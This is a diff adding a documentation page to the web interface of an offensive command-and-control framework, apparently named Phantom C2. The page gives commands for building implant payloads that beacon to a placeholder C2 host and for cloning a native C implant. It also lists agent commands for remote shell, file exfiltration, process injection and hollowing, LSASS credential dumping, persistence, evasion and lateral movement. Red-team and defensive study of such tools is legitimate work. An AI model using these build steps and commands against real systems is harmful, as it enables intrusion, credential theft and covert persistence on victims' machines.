@@ -556,6 +556,8 @@ tr.clickable { cursor: pointer; }
     <button class="sidebar-btn" onclick="nav('audit')" title="Audit Log">📝<span class="sb-label">Audit</span></button>
     <button class="sidebar-btn" onclick="nav('events')" title="Events">📜<span class="sb-label">Events</span></button>
     <button class="sidebar-btn" onclick="nav('settings')" title="Settings">⚙️<span class="sb-label">Settings</span></button>
+    <div class="sidebar-divider"></div>
+    <button class="sidebar-btn" onclick="nav('docs')" title="Documentation">📖<span class="sb-label">Docs</span></button>
     <div style="flex:1"></div>
     <button class="sidebar-btn" onclick="toggleTheme()" title="Toggle Theme" id="theme-btn">🌙<span class="sb-label">Theme</span></button>
   </div>
@@ -1499,6 +1501,69 @@ tr.clickable { cursor: pointer; }
           <thead><tr><th>Time</th><th>Operator</th><th>Agent</th><th>Action</th><th>Detail</th></tr></thead>
           <tbody id="audit-table"></tbody>
         </table></div>
+      </div>
+    </div>
+
+    <!-- ══════ DOCUMENTATION ══════ -->
+    <div id="p-docs" class="page">
+      <div class="card">
+        <div class="card-header"><h3><span>📖</span> Phantom C2 Documentation</h3></div>
+        <div class="card-body padded" style="font-size:13px;line-height:1.6;color:var(--text-primary)">
+          <p style="color:var(--text-muted);margin-bottom:16px">Full guide: <code>docs/USER-GUIDE.md</code> in the Phantom repository.</p>
+
+          <h4 style="margin:18px 0 8px">1 · Start the server</h4>
+          <pre style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;overflow-x:auto;font-family:ui-monospace,Consolas,monospace;font-size:12px">cd ~/phantom
+go run ./cmd/keygen -out configs/
+make server
+./build/phantom-server --config configs/server.yaml --headless --mode both</pre>
+
+          <h4 style="margin:18px 0 8px">2 · Generate a Go agent payload</h4>
+          <pre style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;overflow-x:auto;font-family:ui-monospace,Consolas,monospace;font-size:12px">make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
+make agent-linux   LISTENER_URL=https://your-c2.com:443
+make agent-dll     LISTENER_URL=https://your-c2.com:443
+make agent-shellcode LISTENER_URL=https://your-c2.com:443</pre>
+
+          <h4 style="margin:18px 0 8px">3 · Build the native C implant (PhantomImplant)</h4>
+          <pre style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;overflow-x:auto;font-family:ui-monospace,Consolas,monospace;font-size:12px">git clone https://github.com/phantom-offensive/PhantomImplant.git
+cd PhantomImplant
+# edit src/main.c: C2_SERVER_URL + embed server RSA public key
+make release    # silent implant
+make debug      # console + test harness</pre>
+
+          <h4 style="margin:18px 0 8px">4 · Agent commands</h4>
+          <table style="width:100%;border-collapse:collapse">
+            <thead><tr style="text-align:left"><th style="padding:6px 8px;border-bottom:1px solid var(--border)">Command</th><th style="padding:6px 8px;border-bottom:1px solid var(--border)">Description</th></tr></thead>
+            <tbody>
+              <tr><td style="padding:5px 8px"><code>shell &lt;cmd&gt;</code></td><td style="padding:5px 8px">Execute a shell command</td></tr>
+              <tr><td style="padding:5px 8px"><code>sysinfo</code> · <code>ps</code> · <code>ifconfig</code></td><td style="padding:5px 8px">System info / process list / network</td></tr>
+              <tr><td style="padding:5px 8px"><code>download &lt;path&gt;</code> · <code>upload &lt;l&gt; &lt;r&gt;</code></td><td style="padding:5px 8px">File transfer</td></tr>
+              <tr><td style="padding:5px 8px"><code>screenshot</code></td><td style="padding:5px 8px">Capture screen</td></tr>
+              <tr><td style="padding:5px 8px"><code>shellcode &lt;file&gt;</code></td><td style="padding:5px 8px">Run raw shellcode (indirect syscalls)</td></tr>
+              <tr><td style="padding:5px 8px"><code>assembly &lt;path&gt;</code> · <code>bof &lt;file&gt;</code></td><td style="padding:5px 8px">Run .NET assembly / Beacon Object File</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject &lt;pid|name&gt; &lt;file&gt;</code></td><td style="padding:5px 8px">Remote process injection</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject earlybird &lt;file&gt;</code></td><td style="padding:5px 8px">Early Bird APC injection</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject hijack &lt;file&gt;</code></td><td style="padding:5px 8px">Thread hijack a suspended process</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject hijack-enum &lt;name&gt; &lt;file&gt;</code></td><td style="padding:5px 8px">Thread hijack an existing process</td></tr>
+              <tr><td style="padding:5px 8px"><code>hollow &lt;exe&gt; &lt;file&gt;</code></td><td style="padding:5px 8px">Process hollowing</td></tr>
+              <tr><td style="padding:5px 8px"><code>creds</code></td><td style="padding:5px 8px">LSASS dump (handle dup + fork, elevated)</td></tr>
+              <tr><td style="padding:5px 8px"><code>evasion</code> · <code>persist &lt;m&gt;</code> · <code>sleep &lt;s&gt;</code></td><td style="padding:5px 8px">Evasion / persistence / beacon interval</td></tr>
+              <tr><td style="padding:5px 8px"><code>lateral</code> · <code>socks</code> · <code>portfwd</code> · <code>pivot</code></td><td style="padding:5px 8px">Lateral movement & pivoting</td></tr>
+              <tr><td style="padding:5px 8px"><code>ad-help</code></td><td style="padding:5px 8px">Active Directory command reference</td></tr>
+            </tbody>
+          </table>
+
+          <h4 style="margin:18px 0 8px">5 · PE hollowing (PhantomImplant)</h4>
+          <table style="width:100%;border-collapse:collapse">
+            <thead><tr style="text-align:left"><th style="padding:6px 8px;border-bottom:1px solid var(--border)">Command</th><th style="padding:6px 8px;border-bottom:1px solid var(--border)">Technique</th></tr></thead>
+            <tbody>
+              <tr><td style="padding:5px 8px"><code>inject ghost &lt;pe&gt; [legit]</code></td><td style="padding:5px 8px">Ghost Process Injection</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject ghostly &lt;pe&gt; [legit]</code></td><td style="padding:5px 8px">Ghostly Hollowing</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject herpaderp &lt;pe&gt; [legit]</code></td><td style="padding:5px 8px">Process Herpaderping</td></tr>
+              <tr><td style="padding:5px 8px"><code>inject herpaderply &lt;pe&gt; [legit]</code></td><td style="padding:5px 8px">Herpaderply Hollowing</td></tr>
+            </tbody>
+          </table>
+          <p style="color:var(--text-muted);margin-top:10px">The PE file is a full executable image (e.g. notepad.exe, mimikatz.exe). Default legit image: <code>C:\\Windows\\System32\\RuntimeBroker.exe</code>.</p>
+        </div>
       </div>
     </div>
 
